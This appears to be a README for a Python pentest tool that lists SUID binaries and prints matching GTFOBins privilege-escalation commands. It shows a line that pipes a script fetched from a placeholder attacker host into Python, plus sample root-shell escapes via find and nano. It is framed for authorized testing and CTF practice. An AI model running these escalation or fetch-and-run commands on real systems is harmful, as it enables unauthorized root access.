# gtfo_suid

A lightweight Python3 script for privilege escalation recon on Linux — scans SUID binaries on the current machine and cross-references them with the [GTFOBins](https://gtfobins.org) database to surface ready-to-use exploit commands.

```
  ██████╗ ████████╗███████╗ ██████╗     ███████╗██╗   ██╗██╗██████╗
  ██╔════╝╚══██╔══╝██╔════╝██╔═══██╗    ██╔════╝██║   ██║██║██╔══██╗
  ██║  ███╗   ██║   █████╗  ██║   ██║    ███████╗██║   ██║██║██║  ██║
  ██║   ██║   ██║   ██╔══╝  ██║   ██║    ╚════██║██║   ██║██║██║  ██║
  ╚██████╔╝   ██║   ██║     ╚██████╔╝    ███████║╚██████╔╝██║██████╔╝
   ╚═════╝    ╚═╝   ╚═╝      ╚═════╝     ╚══════╝ ╚═════╝ ╚═╝╚═════╝
        SUID PrivEsc — powered by GTFOBins
```

## Features

- **Zero dependencies** — pure Python3 stdlib, no pip install needed
- **Live GTFOBins data** — fetches the official `api.json` at runtime (478+ binaries)
- **SUID-aware** — distinguishes between generic code and SUID-specific exploit variants
- **Full listing** — shows all SUID binaries found, tagged as known/unknown by GTFOBins
- **Copy-paste ready** — exploit commands printed as-is, one per line

## Usage

```bash
python3 gtfo_suid.py
```

No arguments needed. The script will:
1. Fetch the GTFOBins database
2. Scan the system for SUID binaries (`find / -perm -4000`)
3. Cross-reference and print exploitable binaries with their commands

### Transfer to target (typical pentest workflow)

On your attacker machine:
```bash
python3 -m http.server 8080
```

On the target (low-priv shell):
```bash
python3 <(curl http://<attacker_ip>:8080/gtfo_suid.py) 
```

## Example output

```
════════════════════════════════════════════════════════════
  ⚡ 2 EXPLOITABLE SUID BINARIES FOUND
════════════════════════════════════════════════════════════

┌─ nano  /usr/bin/nano
│  GTFOBins: https://gtfobins.org/gtfobins/nano/
│
│  [SHELL]
│    nano
│    ^R^X
│    reset; sh 1>&0 2>&0
│
│    nano -s '/bin/sh -p'
│    /bin/sh -p
│    ^T^T
│
│  [FILE-READ]
│    nano /path/to/input-file
└──────────────────────────────────────────────────────────

┌─ find  /usr/bin/find
│  GTFOBins: https://gtfobins.org/gtfobins/find/
│
│  [SHELL]
│    find . -exec /bin/sh -p \; -quit
└──────────────────────────────────────────────────────────
```

## Requirements

- Python 3.x
- Internet access to reach `gtfobins.org`
- `find` available on the target (standard on any Linux)

## Disclaimer

This tool is intended for **authorized penetration testing and CTF practice only**. Only use it on systems you own or have explicit permission to test.

## Credits

- [GTFOBins](https://gtfobins.org) by [@norbemi](https://x.com/norbemi) and [@cyrus_and](https://x.com/cyrus_and)
